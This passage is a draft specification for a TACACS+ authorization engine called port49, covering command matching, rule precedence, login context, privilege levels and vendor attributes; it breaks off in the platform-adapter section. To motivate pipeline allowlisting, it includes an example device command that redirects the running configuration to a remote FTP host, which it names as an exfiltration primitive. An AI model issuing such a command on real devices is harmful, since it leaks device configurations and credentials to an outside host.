# port49 — Policy Engine Specification

**Status:** Draft
**Date:** 2026-08-23
**Companion to:** [`2026-08-21-port49-design.md`](2026-08-21-port49-design.md)

This document specifies the authorization engine: how a TACACS+ request becomes a
decision. The design document covers architecture and rationale; this one is meant to be
implementable.

Configuration keys are `snake_case` throughout.

---

## 1. Scope

The engine answers three questions, at three different moments:

| Point | Question | Component |
|---|---|---|
| **Mint** | May this principal reach this device at all? | broker |
| **Session** | What shell profile does this login get? | daemon |
| **Command** | May this command run here, now? | daemon |

The original design named only the first and third. The session point — the `service=shell`
authorization with an empty `cmd`, which returns `priv-lvl`, `shell:roles`,
`local-user-name`, `idletime`, and friends — is where a large share of real-world TACACS+
deployments do *all* of their authorization, and it must be first class.

---

## 2. Concept model

| Concept | Answers | Authored by | Lives in |
|---|---|---|---|
| **Device** | Which NASes may connect, what vendor, where, with what key | imported or generated | inventory snapshot |
| **Platform** | How to speak a vendor's dialect | port49 ships it | built-in, override rare |
| **Scope** | Which devices a rule covers | operator | policy repo |
| **Principal** | Who actually walked in the door | nobody — runtime | request |
| **Subject** | Which principals a rule applies to | operator | policy repo |
| **Role** | Which commands | operator | policy repo |
| **Privilege level** | What the device is told at login | operator names, port49 renders | policy repo + platform |
| **Grant** | Subject × scope × roles × level × expiry | operator | policy repo |

Two distinctions carry most of the weight:

**Device is a fact; Scope is a selector.** Inventory is imported and describes reality.
Scopes are authored and describe intent. Keeping them separate is what makes
`match: {site: us_west}` mean something.

**Principal is runtime; Subject is policy.** A principal is `CN=alice,OU=netops,O=example`
or `system:serviceaccount:netops:oxidized`. A subject is how policy addresses a set of
them, and it has exactly two forms — an LDAP group, or one or more literal identities. That
single mechanism covers both directory-driven human access and hand-maintained service
accounts.

**A subject MAY list several identities.** Matching already resolves a set — an LDAP group
yields many principals — so accepting a list costs nothing and makes credential migration a
non-event:

```yaml
subjects:
  - name: svc_oxidized
    identity:
      - "spiffe://port49/host/oxidized-01"        # VM, workload certificate
      - "system:serviceaccount:netops:oxidized"   # Kubernetes, once migrated
    enable: token
    token_ttl: 900s
```

Both resolve to the same subject and therefore the same grants. An operator adds the second
identity, cuts over, and removes the first — with no window in which the workload is denied
and no policy change during the migration. It also covers a workload that legitimately runs
in two places at once.

Identities from different trust domains MUST remain distinguishable (§7 of the design
document): listing a human and a machine identity under one subject is a policy load error,
not a convenience.

**Privilege decides what the device will offer; the role decides what port49 will permit
within it.** The two are not independent axes — the effective permission set is the
intersection, and the role is always a subset. A backup account needs `admin` privilege so
`show running-config` is *reachable*, while command rules confine it to `show`. Set the
level too low and permitting rules become dead letters, because the device never submits
those commands. See §6.

---

### Terminology

Several words in this problem space are overloaded. These are used precisely throughout both
documents.

| Term | Means |
|---|---|
| **session** | the operator's authenticated state, 8–16 hours, held by the agent and never sent to a device |
| **login** | one shell session on one device |
| **login context** | the daemon's per-login record, keyed `(nas, port)` |
| **session authorization** | the TACACS+ exchange at login — `service=shell` with an empty `cmd` — which returns the shell profile |
| **token** | the short-lived, single-use, device-bound secret port49 mints |
| **presented credential** | what arrives in the authentication packet: the token itself for PAP and ASCII, and `ppp_id ‖ challenge ‖ response` for CHAP |

Note that **session authorization** names a protocol exchange while **session** names the
operator's day; they are unrelated despite the shared word, and the protocol term is fixed by
RFC 8907. **Token** and *handle* were previously used interchangeably; *handle* is retained
only where the design document contrasts an opaque handle with a signed token.

---

## 3. Request normalization

The matcher never sees raw wire data. A platform adapter converts an authorization request
into a canonical form:

```
principal      resolved from login context, not from the wire
device         resolved from source address via inventory
service        shell | <other>
privilege      priv_lvl from the request header
command        [cmd, arg1, arg2, ...]     lower-cased, <cr> stripped
pipeline       [[stage_cmd, arg, ...], ...]   split at the platform's pipe token
```

### Why normalization is its own layer

A command authorization request arrives tokenized, not as a string:

```
cmd=show  cmd-arg=running-config  cmd-arg=|  cmd-arg=redirect
cmd-arg=ftp://10.9.9.9/cfg  cmd-arg=<cr>
```

Reconstructing that into `"show running-config | redirect ftp://10.9.9.9/cfg"` and matching
a regex against it is the traditional approach and it is lossy: the `=` versus `*` flag is
discarded, embedded whitespace becomes indistinguishable from argument boundaries, and two
different requests can produce the same string. Matching the vector directly avoids the
entire class.

### Normalization rules

1. **Strip the trailing `<cr>`** where the platform sends one.
2. **Split at the pipe token** into a command and zero or more pipeline stages.
3. **Lower-case for comparison.** Device CLIs accept mixed-case keywords, so
   case-sensitive matching would be trivially bypassable with `SHOW run`. Literal terms
   therefore match case-insensitively. Regex terms match as written.
4. **Expand abbreviations** where `expands_abbreviations: false`. If a platform sends what
   the operator typed rather than the resolved command, `sh run` must be expanded to
   `show running-config` before matching, or `show **` is bypassable. Where port49 cannot
   expand reliably, the platform MUST be marked as such and the daemon MUST fail closed
   rather than match a possibly-abbreviated vector.
5. **Preserve argument boundaries.** Arguments are never re-joined.

---

## 4. Matching

### Grammar

A rule is a whitespace-separated sequence of terms, matched against the canonical command
vector.

| Term | Matches | Specificity |
|---|---|---|
| `word` | exactly that argument, case-insensitively | 4 (most specific) |
| `@class` | one argument in a platform-defined entity class (§8) | 3 |
| `/re/` | one argument matching the RE2 expression | 2 |
| `*` | exactly one argument, any value | 1 |
| `**` | zero or more arguments — **trailing position only** | 0 (least specific) |

```yaml
permit:
  - show **                          # show, and anything after it
  - show bgp summary                 # exactly that, nothing more
  - clear counters *                 # one argument
  - interface @physical              # platform-defined class
  - interface /^(ethernet|port-channel)[0-9/.]+$/
```

**Rules match the full vector.** There is no implicit prefix match — `show bgp summary`
does not match `show bgp summary detail` unless the rule ends in `**`. This is the
property that makes the engine safe by default and is the main practical difference from
unanchored regex.

**`**` is trailing-only** so matching stays linear. Mid-pattern wildcards would be needed
to express things like `show ** | redirect **`; splitting the pipeline out during
normalization removes that need entirely, which is why the split belongs in the adapter
rather than in the grammar.

**Regex is confined to a single argument.** RE2 (Go's `regexp`) has no catastrophic
backtracking, and a leaf regex can never span argument boundaries, so its blast radius is
one position. Regex terms are also the only construct that degrades the effective-permission
diff (§12), which is a reason to prefer literals, `@class`, and `*` where any will do.

**Entity classes solve cross-platform naming.** A rule reading
`deny: interface /^(management|mgmt)/` works on EOS and NX-OS and silently does nothing on
Junos, where the interface is `fxp0` — no error, no warning, the deny simply never matches.
Writing `deny: interface @management` instead delegates the spelling to the platform
adapter, which classifies rather than canonicalizes. We never need to know that `ge-0/0/1`
and `Ethernet1/1` are the same kind of thing; we only need each platform to say which of
its names are management interfaces. A rule referencing a class the platform does not
define is a **policy load error**, which makes the silent-no-match failure impossible.

### Pipeline stages

Output modifiers are matched separately and are **allow-listed, not deny-listed**. A
blocklist fails open on the next vendor extension; an allowlist does not.

Every role inherits a shipped default allowlist unless it declares its own:

```yaml
pipe:
  permit: [include **, exclude **, begin **, section **, json, count, no_more]
```

This matters because `show running-config | redirect ftp://…` is an exfiltration primitive
and `| append` is a write primitive, both wearing a read-only command's clothes. A role
whose only rule is `show **` permits both unless pipeline stages are evaluated.

Each stage of a chain is evaluated independently:
`show run | section bgp | include neighbor` is two stages, both checked.

**Platform caveat.** Some devices apply output modifiers locally *after* authorizing the
base command, so the pipeline never reaches port49. Those platforms MUST set
`pipe_authorized: false`, and port49 MUST NOT imply a protection it cannot deliver — the
control moves onto the device (disabling `copy`, `redirect`, file privileges). `port49
explain` MUST say so when asked about a pipeline rule on such a platform.

---

## 5. Evaluation

### 5.1 Mint (broker)

```
principal
  → subjects            match by LDAP group membership or any listed identity
  → grants              those whose subject matches AND whose scope matches this device
                        AND whose `expires` has not passed
  → roles               union across matching grants
  → privilege           max over granted roles (no grant-level override)
  → max_privilege       max over matching grants; absent means no escalation
  → effective rules     resolved permit/deny/pipe sets
  → av_pairs            rendered for this device's platform
```

Failure to match any grant means the device is unreachable for that principal, and the mint
fails **before an SSH connection is opened**.

### 5.1.1 Where the resolved policy waits

The broker computes this result, but the daemon needs it — and the key it will eventually
live under is not knowable at mint. Login context is keyed on `(nas, port)`, and the port
is the device's tty or vty string, which does not exist until the device opens the
authentication exchange. **The broker therefore cannot write login context.**

The resolved result is instead stored as an immutable, **content-addressed policy blob**,
referenced by the token:

```
blob:<sha256>            the resolved value: rules, pipe allowlist, attributes,
                         privilege, max_privilege, enable mechanism
token:(nas, username)    { handle, blob_hash, principal, ... }
```

On successful redemption the daemon creates login context, which holds **the hash rather
than a copy**:

```
ctx:(nas, port)          { principal, username, privilege, blob_hash }
```

**Why content-addressed.** A batch mint resolves to the same value for every device in one
scope — what varies is the rendered attributes, and those vary by *platform*, not by device.
A sweep across 10,000 devices spanning four platforms therefore produces **four** blobs, not
ten thousand. The blob is written once and referenced by every token that resolves to it.

**Why the context holds a hash.** Blobs are immutable, so each daemon replica caches them by
hash indefinitely with no invalidation problem. Per-command authorization is then one small
context read plus a local cache hit, rather than two store round trips — which is what keeps
the p99 target reachable.

**Lifetime.** A blob carries a TTL slightly exceeding the maximum token TTL, so it expires on
its own. No reference counting is required.

**Cost.** One additional store read at redemption, on the *login* path. The p99 < 5ms target
governs per-command authorization, which is unaffected.

### 5.1.2 Refreshing live context

The broker refreshes login context while a login remains active (design document §9), which
requires it to discover which contexts exist. Nothing in the store makes that discoverable by
itself, and scanning the keyspace is both store-specific and expensive at scale.

The daemon MUST therefore maintain an index as it creates and tears down context:

```
contexts_by_principal:(principal)   → set of (nas, port)
```

Refresh then means: the broker re-resolves for a principal whose group membership has
changed, writes a new blob if the result differs, and updates `blob_hash` in each of that
principal's live contexts. Contexts are small, so the update is cheap, and because blobs are
immutable a replica's cached copy of the old blob is never wrong — it is simply no longer
referenced.

This also makes **policy-driven revocation reach active sessions**, not only directory-driven
revocation. A policy change that removes a grant produces a different blob, and live contexts
pick it up on the next refresh.

### 5.2 Session authorization (daemon)

On `service=shell` with an empty `cmd`, the daemon returns the AV pairs already stored in
login context. No computation, no platform knowledge, one store read.

If login context is absent, the daemon fails closed and logs a distinct reason —
`context_missing` is operationally very different from `denied_by_policy` and the two must
never share a log line.

### 5.3 Command authorization (daemon)

```
normalize(request)
  → if no login context                → DENY (context_missing)
  → collect every matching rule, permit and deny alike
  → if none match                        → DENY (default_deny)
  → winner = greatest specificity tuple; ties → deny
  → if winner is a deny                  → DENY (rule, role)
  → for each pipeline stage:
        if stage matches no pipe permit  → DENY (pipe_stage, stage_name)
  → PERMIT (rule, role)
```

Default is deny. Every decision carries the rule and role that produced it, which is what
makes `explain` able to name exactly one reason.

Requests for a `service` other than `shell` are denied by default with a distinct reason,
configurable per platform.

### 5.4 Composition across roles

**Most-specific match wins, resolved position by position. Ties go to deny.**

There is exactly one deny mechanism. Permits and denies from every granted role are
collected into one set, and the rule whose specificity tuple is greatest decides.

```
specificity of a rule = the per-position tuple from §4,
                        compared lexicographically

show chassis hardware   →  (lit, lit, lit)     permit
show chassis **         →  (lit, lit, ** )     deny
                                    ↑ first difference: lit > **  →  PERMIT
```

Specificity is a property of the rule, not of its position in the file, so **evaluation is
order-independent**: reordering roles, grants, or rules within a role cannot change any
decision. Formatters, merge conflicts, and role refactors are provably safe.

Because rules insert into a trie and the result is a total function over command space, the
**effective-permission diff stays exact** — old versus new is a computable difference, not a
sample of whatever commands a test corpus happened to contain.

**Why not deny-overrides.** A global deny-wins rule is simpler to state, but it cannot
express an exception. Once `show chassis **` is denied — say, in response to a CVE — the
only remedy is to narrow the deny itself, which requires negation: *deny `show chassis`
anything except `hardware`*. The leaf regex is RE2, which has **no lookahead**, so
`/^(?!hardware$)/` does not compile, and the alternative is enumerating every subcommand
positively and being wrong the next time the vendor adds one. Deny-overrides therefore
needs an exception mechanism bolted on regardless; most-specific supplies one in the grammar
already present. This is not hypothetical — a broad `show chassis *` deny added for a CVE
breaking a backup account's `show chassis hardware` is the motivating case.

**What is given up, and what replaces it.** Under deny-overrides a deny is a guarantee.
Under most-specific it is a default that a more specific permit can override. The
replacement is not a second construct but **visibility**: CI MUST report every shadowed
deny, naming the rule, the subject, and the permit that beats it.

```
⚠ SHADOWED — this deny will NOT apply:
    svc_oxidized  permits "show chassis hardware"        (more specific)
    security_ir   permits "show chassis cluster status"  (more specific)
```

You learn the deny is incomplete when you write it, not when a backup run fails.

**Deliberate exemptions use the same mechanism.** A narrower permit is how an exception is
expressed, so incident response reaching one command under a broad prohibition needs no new
concept:

```yaml
roles:
  - name: cve_2026_xxxx
    reason: "CVE-2026-XXXX — SRX cluster subsystem"
    deny:  [show chassis cluster **]

  - name: cve_2026_xxxx_assess
    reason: "CVE-2026-XXXX — IR needs cluster state to assess exposure"
    permit: [show chassis cluster status]
```

**Two consequences for CI.** A deny may be inert if shadowed, so *"adding a deny is always
safe"* no longer holds; and a permit may override a deny, so *"only permit growth widens
access"* becomes the check that matters. Both are computable from the trie, and the gate is
stated directly: **this change makes command C permitted where it was denied.**

### 5.5 Scoping policy to device state

Scopes match device attributes (§10), and those attributes change. A scope keyed on a
*changing* fact makes the population it selects shrink as reality changes, which turns
mitigation into something that lapses on its own:

```yaml
scopes:
  - name: srx_unpatched
    match:
      platform: juniper_junos
      os_version: {lt: "21.4R3-S5"}
    on_missing: include        # no version data → assume vulnerable
    security_log: true         # membership changes log as security events

grants:
  - {subject: everyone, scope: srx_unpatched, roles: [cve_2026_xxxx]}
```

`everyone` is a built-in subject matching every principal. It is not a special deny path —
the same role and grant machinery, applied universally — which is why there is still only
one place to deny a command.

Three properties make this materially better than a curated device list:

- **Coverage includes devices that do not exist yet.** A device racked after the CVE lands
  is covered the moment it appears in inventory. Hand-maintained lists cannot do this.
- **Mitigation lifts per device as it is remediated**, so partial upgrades behave correctly
  and no coordinated removal step is required.
- **Scope size is the remediation burndown**, queryable rather than tracked in a spreadsheet.

The same shape covers other lifecycle states: `{tag: change_freeze}` to deny configuration
during a freeze, `{status: staged}` to restrict pre-production devices, `{status:
decommissioning}` for read-only on the way out.

**Two requirements this places on the implementation.**

`on_missing` MUST be explicit where an attribute is optional, and the safe direction differs
by rule type: for a deny-bearing scope, a missing attribute means *include* (assume
vulnerable); for a permit-bearing scope it means *exclude*. A broken inventory sync silently
lifting a mitigation is the failure to design against.

`security_log: true` marks a scope whose membership changes are security events. This is
required because a scope keyed on device state makes **source-of-truth write access
security-relevant** — whoever can edit `os_version` can lift a mitigation without touching
policy, and that field is often written by a discovery tool rather than a person. Version
data used for security scoping SHOULD come from an attested path.

### Version comparison

`lt` and `gte` on a version string use one generic comparator. Vendor version strings are not
semver — `21.4R3-S5`, `4.31.2F`, `10.2(5a)`, `15.2(4)E10` — and a semver library would
actively mis-order them, since semver treats a suffix after a dash as a *pre*-release and
would sort Junos service release `21.4R3-S5` **below** `21.4R3`.

Instead, tokenize into runs of digits and runs of letters, discarding separators
(`.`, `-`, `(`, `)`, `_`, `/`), upper-casing letters, then compare element by element:

| Comparison | Rule |
|---|---|
| digit run vs digit run | numeric |
| letter run vs letter run | **equality only** — never alphabetical, since `M > F` is meaningless |
| letter run vs digit run | incomparable |
| one sequence is a prefix of the other | the shorter is lower |

```
21.4R2-S9  → (21,4,R,2,S,9)
21.4R3     → (21,4,R,3)         position 3: 2 < 3   → R2-S9 is older
4.31.2F    → (4,31,2,F)
4.31.10F   → (4,31,10,F)        position 2: 2 < 10
17.09.04a  → (17,9,4,A)
17.09.04   → (17,9,4)           shorter is lower    → the rebuild is newer
10.2(5a)   → (10,2,5,A)
```

**An incomparable version is treated exactly as a missing one**, resolving through
`on_missing` — included in a deny-bearing scope, excluded from a permit-bearing one. If it
cannot be determined whether a device is patched, it is assumed not to be. This requires no
per-vendor configuration and fails in the safe direction.

Letters are compared by equality because their meaning is vendor-specific: in Arista's scheme
`F` and `M` mark lifecycle stage within one train, while Cisco's `E` and `S` are separately
built trains that are genuinely not orderable.

**Letters are reached only when every preceding number is equal**, which makes incomparability
rare in practice. Arista increments the third digit across the F-to-M transition, so
`4.31.5M` versus `4.31.2F` resolves at position 2 — `2 < 5` — and the letters never enter into
it. The genuine collision is `15.2(4)E10` versus `15.2(4)S10`, where the numeric prefixes match
and position 3 is `E` against `S`; refusing there is correct, because those are different code
bases rather than different points on one line.

**That cost MUST be visible.** Any scope resolving a version comparison MUST report the
devices it included because comparison failed:

```
srx_unpatched: 47 devices
  ⚠ 3 included because their version could not be compared to "21.4R3-S5"
      srx-fw-22 (21.4X75-D40), srx-lab-01 ("unknown"), srx-fw-31 (21.2R1-EVO)
```

The remedy is then obvious — an explicit version list, a regex, or exclusion by another
attribute. Silent inclusion is what makes this dangerous; reported inclusion makes it
ordinary.

Exact and regex matching on version strings remain available and require no comparator.

CI SHOULD report a scope that has matched no devices for an extended period — a mitigation
whose population has emptied is dead code, and saying so is how policy cleans itself up.

---

### 5.6 Login context lifecycle

**Creation.** Login context is created **only on successful token redemption**, by the
daemon, keyed `(nas, port)`. Nothing else creates it. A session port49 did not authenticate
therefore has no context and is denied — which is correct, since port49 has no basis on which
to authorize it.

```
ctx:(nas, port)   { principal, username, rem_addr, privilege, blob_hash }
```

**Bound attributes.** `username` and `rem_addr` are recorded at creation and compared
thereafter:

| Exchange | Check |
|---|---|
| command authorization | `username` MUST match; a mismatch denies and invalidates |
| enable, `enable_username: principal` | `username` MUST match |
| enable, `$enab{level}$` platforms | `rem_addr` MUST match |

**Teardown.** Four triggers, in decreasing reliability:

1. **Successful redemption** for the same `(nas, port)` — overwrites unconditionally.
2. **An authentication START for the same `(nas, port)` carrying a different username** —
   invalidates, *including one port49 rejects*. A failed authentication is still evidence
   that a new session is beginning on that line. With ASCII login the username may arrive in
   a CONTINUE, so the check fires once the username is known rather than on the START itself.
3. **Exec accounting START or STOP** for that port, where accounting is configured and
   reaches us. START is the more useful signal: a STOP can be lost, but a START means whatever
   was on that line is over regardless.
4. **TTL expiry.**

**TTL is a backstop, not a control.** It SHOULD match the session lifetime and be extended by
activity. A short TTL was previously doing security work it cannot do — it narrows a window
without closing it, while denying idle operators mid-session with `context_missing`. The
bindings above close the window; the TTL only bounds abandoned state.

#### Why `enable: auto` is restricted

Method lists fall through to a later method only on **ERROR** (the server is unreachable), not
on **FAIL** (an explicit reject). So a session that authenticates locally rather than through
port49 implies port49 was *unreachable at that moment* — which means trigger 2 never fired,
because we never saw the START.

The remaining exposure is therefore: port49 unreachable when a session begins, reachable again
by the time that session issues `enable`, on a platform whose enable exchange carries
`$enab{level}$` rather than the principal. The stale context resolves and the new occupant
inherits the previous user's ceiling.

**`enable: auto` MUST NOT be available on a platform whose `enable_username` is not
`principal`.** Granting it there is a policy load error. Those platforms use `enable: token`
or `enable: none`, both of which require a credential the previous occupant's context cannot
supply. `rem_addr` comparison covers the same case as defense in depth, and a mismatch is a
high-signal event worth alerting on.

**Blast radius when it does occur** is limited by the command-authorization username check:
the escalated occupant obtains an elevated shell, but every command they run arrives with
their own username, mismatches the stored one, and is denied — and a denial is FAIL, so no
fallback to local authorization follows. The escalation converts into real access only on
devices where command authorization does not cover that privilege tier, which is precisely
what the accounting reconciliation in §9 exists to surface.

**Local account names MUST NOT collide with principal names.** A device-local `bob` that is
not the port49 principal `bob` matches on username and inherits the context. The reference AAA
configuration MUST require disjoint namespaces for break-glass and local accounts, and port49
SHOULD warn when it observes a local fallback succeed for a name it knows.

#### To be established in the lab

These are measurements, not assumptions, and belong in the containerlab matrix:

- Whether the enable START carries `rem_addr` on each platform, and what it contains — the
  field is free-form in RFC 8907 and devices are believed to send the bare address, but if any
  platform includes a source port it discriminates sessions from a shared jump host, which
  the address alone cannot.
- Method-list fall-through and `deadtime` behavior per platform, since both bound the exposure
  window above.
- Whether exec accounting START and STOP arrive reliably enough for trigger 3 to be worth
  depending on.

---

## 6. Privilege levels and session attributes

### What a privilege level is

**Privilege decides what the device will offer. The role decides what port49 will let you
run. The effective permission set is the intersection, and the role is always a subset.**

A privilege level is the session's local access level on the device. It is not an
independent axis alongside command authorization, and it is also the policy that applies
when port49 is unreachable.

```
login  →  broker returns  priv-lvl=15, shell:roles*network-admin
              │
              ├─ gate 1: the DEVICE decides what this session can reach.
              │          priv-lvl governs what is present in the CLI at all;
              │          any device-local role carries its own permit/deny set.
              │
              └─ gate 2: for commands the device submits, port49 rules decide.
```

Command rules can only **narrow** what the level offered; they can never widen it. Returning
`priv-lvl=1` means the device will not offer `show running-config`, will never submit an
authorization request for it, and a rule permitting it is dead. Conversely, a backup account
needs `privilege: admin` so the command is *reachable*, while `permit: show **` is what
confines it once it is.

**The device-local role is not vestigial.** It governs two situations that port49 does not:

- **When port49 is unreachable.** Under `aaa authorization commands … group tacacs+ local`,
  the device falls back to local authorization, and the role assigned at login is what
  remains. This is the "active login" column of the design document's failure matrix — the
  device role *is* the degraded-mode policy.
- **Commands the device never submits.** With `aaa authorization commands 15` and no
  `commands 1`, everything below that tier is governed by the device role alone, always.

The device-local role SHOULD therefore be chosen as a sane approximation of the port49
role, not as a formality. Two CI checks make the relationship visible (§12).

### Abstract levels

Levels are an **ordered enum**. `readonly`, `operator`, and `admin` ship built in, are
reserved, and cannot be renamed or removed — that guarantees every shipped platform file
keeps working regardless of what an operator declares. Unused levels cost nothing.

Declaring `privilege_levels` **replaces the default ordering**, because order is what the
max-join uses:

```yaml
privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: senior_operator,   parent: operator}
  - {name: admin}
```

`parent:` is the escape hatch that makes custom levels practical. A new level would
otherwise need a mapping for every platform in the fleet; `parent: operator` says *render as
`operator` on any platform that does not define this level explicitly*, resolved
transitively up the chain.

This also turns an existing wart into declared behavior. NX-OS is role-native with two
built-in roles, so `readonly` and `operator` render identically there — with `parent:` that
is visible and intentional rather than a surprise. Usually it is exactly right:
`read_only_limited` differs from `readonly` in *which commands port49 permits*, not in what
the device needs to be told. Platforms may still override where the distinction is real.

A level with no mapping and no resolvable `parent:` chain, on a platform present in
inventory, is a **policy load error**.

**Reordering the list is a breaking change.** Inserting a level mid-list changes every
max-join that crosses it, and the effective-permission diff MUST report that as a privilege
change rather than a cosmetic one.

The operator writes `privilege: readonly` on a role. Where multiple roles are granted, the
effective level is the **max** over the enum. A role with no `privilege` contributes
nothing.

### Three role shapes

Privilege is declared on the **role**, never overridden on a grant. An override has nowhere
to record *why* it exists, and — because the level also determines the device-local role
that applies when port49 is unreachable — burying one in a grant row silently changes
degraded-mode behavior. A named role can carry a `reason:`.

Composition, not variants, prevents role explosion. A role may carry only a privilege:

```yaml
roles:
  - name: read_only
    privilege: readonly
    permit: [show **]

  - name: elevated_session
    privilege: admin
    reason: "device exposes show running-config only at level 15"
    # no permit/deny — contributes a level and nothing else

grants:
  - {subject: svc_oxidized, scope: all_devices, roles: [read_only, elevated_session]}
```

Effective level is `max(readonly, admin)`; commands stay `show **`. One named elevation is
granted where needed rather than forking `read_only_admin`, `read_only_operator`, and so on.

| Shape | Carries | Example |
|---|---|---|
| commands + privilege | both | `read_only`, `bgp_operator` |
| commands only | contributes nothing to the max | `no_disruptive`, `cve_2026_xxxx` |
| privilege only | no rules | `elevated_session` |

### Attributes are transported, not understood

Vendor attributes are unbounded — F5 partitions, Palo Alto access domains, Fortinet
profiles, Nokia home directories, and whatever ships next quarter. port49 MUST NOT require
knowledge of any of them.

RFC 8907 already defines the wire format: `attribute=value` is mandatory,
`attribute*value` is optional. Every vendor attribute ever invented fits that. port49's
obligation is therefore to **transport faithfully and validate structurally**, never to
interpret. Unboundedness stops being a problem provided the schema accepts anything and
defaults to the non-breaking choice.

### Where attributes are declared

**Platform file**, for anything tied to a level. Operators may extend a shipped platform or
define their own in the policy repository, with no upstream change required:

```yaml
platforms:
  f5_bigip:
    authorizes: [session]
    privilege:
      readonly: ["F5-LTM-User-Role*700", "F5-LTM-User-Partition*all",
                 "F5-LTM-User-Console*1"]
      admin:    ["F5-LTM-User-Role*0",   "F5-LTM-User-Partition*all",
                 "F5-LTM-User-Console*1"]
```

Most vendor attributes live here, because most of them *are* the level expression.

**Role and grant**, keyed by platform, for anything that is not a level:

```yaml
roles:
  - name: read_only
    privilege: readonly
    permit: [show **]
    attributes:
      all: ["idletime*30", "timeout*480"]

grants:
  - subject: team_a
    scope: f5_fleet
    roles: [read_only]
    attributes:
      f5_bigip: ["F5-LTM-User-Partition*prod"]
```

Layering is **platform → role → grant**, most specific wins on a duplicate attribute name,
and CI MUST report the shadowing so an override never happens silently.

Values support a **fixed** substitution vocabulary — `{username}`, `{principal}`,
`{device}`, `{privilege}` — and nothing more. `home-directory*/home/{username}` is the
motivating case; a general template language would be a footgun.

### Validation without semantics

port49 cannot check what an attribute means. It MUST check everything else:

- Exactly one `=` or `*` separator, non-empty attribute name, no duplicate names.
- **Length.** The RFC's argument length field is one byte, so **255 bytes per attribute**,
  and `arg_cnt` is likewise one byte. A generated `deny-commands` regex (§8) will exceed
  this before anything else does, and it fails as a truncated or dropped attribute rather
  than a clean error. Enforce at policy load.
- Mandatory versus optional, with a warning on any mandatory attribute not recognized.

**Unknown attributes default to optional (`*`).** A mandatory attribute a device cannot
parse causes it to reject the entire session, breaking every login on that platform.
Defaulting to optional means adding a custom attribute cannot take down a fleet; declaring
one mandatory is then a deliberate, reviewable act.

**Not every level is natively representable.** NX-OS is role-native with two built-in roles,
so `readonly` and `operator` render identically and the distinction is carried entirely by
command authorization. That is acceptable, but it MUST be visible in the platform file
rather than silently surprising.

**Platforms that are not `priv-lvl`-native** (Junos maps to `local-user-name`) MUST declare
a mapping for every level. A missing mapping is a **policy load error in CI**, not a broken
login at 3am.

### Diagnosing an unfamiliar vendor

Because port49 cannot validate semantics, it MUST make the outcome inspectable:

```
$ port49 explain --subject team_a --device f5-lb-01 --show-attributes
session attributes that would be returned:
  F5-LTM-User-Role*0            (optional)  ← platform f5_bigip, level admin
  F5-LTM-User-Partition*prod    (optional)  ← grant override, shadows platform "all"
  F5-LTM-User-Console*1         (optional)  ← platform f5_bigip, level admin
  idletime*30                   (optional)  ← role read_only
```

And when a device rejects session authorization immediately after attributes are returned,
port49 MUST name the likely cause rather than leaving it to be guessed: *"f5-lb-01 rejected
session authorization; 1 mandatory attribute was sent (`X=Y`) — an unsupported mandatory
attribute causes rejection."*

---

## 7. Escalation (`enable`)

Enable is a real workflow and must be supported, not designed around.

### What the wire looks like

Typing `enable` produces a **new authentication** — usually on a new TCP connection — with
`authen_service=ENABLE`, `priv_lvl` set to the requested level, `authen_type=ASCII` on
essentially every platform, and a username that is frequently `$enab15$` rather than the
principal.

Three consequences:

1. No token exists for it — the operator is already logged in and typing interactively.
2. The username does not identify the principal, so **login context MUST be keyed on
   `(nas, port)`**, with the username as a verified attribute rather than part of the key.
3. The enable password was never a second authentication. It is a shared device secret or a
   per-user password in the TACACS database. With certificate identity, whoever holds that
   TTY has already proven who they are — so enable is an *authorization* decision.

### Configuration

```yaml
subjects:
  - name: netops_admins
    group: "CN=netops-admins,OU=Groups,DC=example,DC=com"
    enable: token          # none | auto | token   (default: none)

grants:
  - {subject: netops_admins, scope: all_devices, roles: [network_admin],
     max_privilege: admin}
```

The **ceiling** (`max_privilege`) is an authorization fact and lives on the grant, resolved
as a max across matching grants. The **mechanism** (`enable`) is a property of the consumer
and lives on the subject, so two grants can never disagree about it.

| Mechanism | Behavior | Fits |
|---|---|---|
| `none` | Enable is refused. The login-time privilege is all there is. | Read-only pollers whose granted level already suffices. |
| `auto` | Daemon resolves `(nas, port)` → login context, checks the ceiling, PASSes. Any password accepted. **Available only where `enable_username: principal`** (§5.6). | Tools that insist on typing `enable` where plumbing a second secret is awkward. |
| `token` | A second minted token, supplied at the prompt. | Anything needing a discrete, attributable escalation record. |

### Automation

The mint returns a **pair**, because every relevant tool already has a second credential
field — `enable:` in Oxidized, `secret=` in Netmiko:

```python
tok  = port49.token(device)      # {"login": "p49_7K2Q…", "enable": "p49_R4XN…"}
conn = ConnectHandler(device_type="cisco_nxos", host=device,
                      username="svc-config-backup",
                      password=tok.login, secret=tok.enable)
```

Both are device-bound, single-use, and share a TTL. No tool changes.

Worth noting that `enable: none` is often the honest answer for backup accounts: they type
`enable` because the account landed at privilege 1. Granting the read-only role at `admin`
privilege removes the escalation entirely.

After a successful escalation, login context records the new privilege level, since
command rules may differ above and below the line, and accounting attributes the event to
the **real principal** even though the wire said `$enab15$`.

---

## 8. Platform adapters

A platform adapter is a small declarative file. Adapters ship built in, are verified in the
containerlab matrix where an image exists, and are both overridable and contributable.

```yaml
platforms:
  arista_eos:
    supports: [session, commands, config_commands]
    privilege:
      readonly: ["shell:priv-lvl=1",  "shell:roles*network-operator"]
      operator: ["shell:priv-lvl=7"]
      admin:    ["shell:priv-lvl=15", "shell:roles*network-admin"]
    entity_classes:
      management: ['^Management[0-9]+$']
      loopback:   ['^Loopback[0-9]+$']
      physical:   ['^Ethernet[0-9/.]+$', '^Port-Channel[0-9]+$']
    enable_username: principal
    expands_abbreviations: true
    pipe_token: "|"
    pipe_authorized: true
    port_pattern: '^vty[0-9]+$'
```

Most devices need far less. A time server or a BMC that does authentication plus one
attribute is complete in four lines:

```yaml
  meinberg_lantime:
    supports: [session]
    privilege:
      readonly: ["priv-lvl=1"]
      admin:    ["priv-lvl=15"]
```

### Fields

| Field | Purpose | Required |
|---|---|---|
| `privilege` | level → attributes at session authorization | always |
| `supports` | capability declaration (see §9) | always |
| `entity_classes` | named sets of device entity names, referenced as `@class` in rules | if rules use classes |
| `enable_username` | `principal`, or a template such as `$enab{level}$` | if enable is supported |
| `expands_abbreviations` | whether the device sends resolved command words | if `commands` |
| `pipe_token` / `pipe_authorized` | modifier separator; whether it reaches us | if `commands` |
| `command_projection` | how rules render for session-only platforms (below) | if `session`-only |
| `service` | authorization `service` value if not `shell` | rarely |
| `port_pattern` | expected `port` shape, used only for drift detection | optional |

### Entity classes

Entity classes **classify, they do not canonicalize**. port49 never needs to know that
